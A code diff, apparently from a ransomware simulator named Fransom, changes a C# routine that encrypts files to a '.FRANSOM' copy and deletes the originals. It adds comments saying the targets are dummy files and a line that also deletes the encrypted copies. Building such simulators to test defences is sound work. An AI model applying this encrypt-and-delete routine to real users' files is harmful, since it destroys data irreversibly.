@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Diagnostics;
@@ -709,10 +709,11 @@ namespace Fransom
                 try
                 {
                     string file_name = obj.ToString();
-                    Logger.WriteLine("Encrypting and deleting object: " + file_name);
-                    string enc_file = file_name + ".FRANSOM";
-                    EncryptFile(file_name, enc_file, password);
-                    File.Delete(file_name);
+                    Logger.WriteLine("Encrypting and deleting object: " + file_name); // dummy files are created, encrypted and source files deleted
+                    string enc_file = file_name + ".FRANSOM"; // we can change the extension 
+                    EncryptFile(file_name, enc_file, password); // this creates enc files
+                    File.Delete(file_name); // this deletes source files - after this only enc files remain in Fransom directory
+                    File.Delete(enc_file); // this deletes enc files
                 }
                 catch (Exception e)
                 {
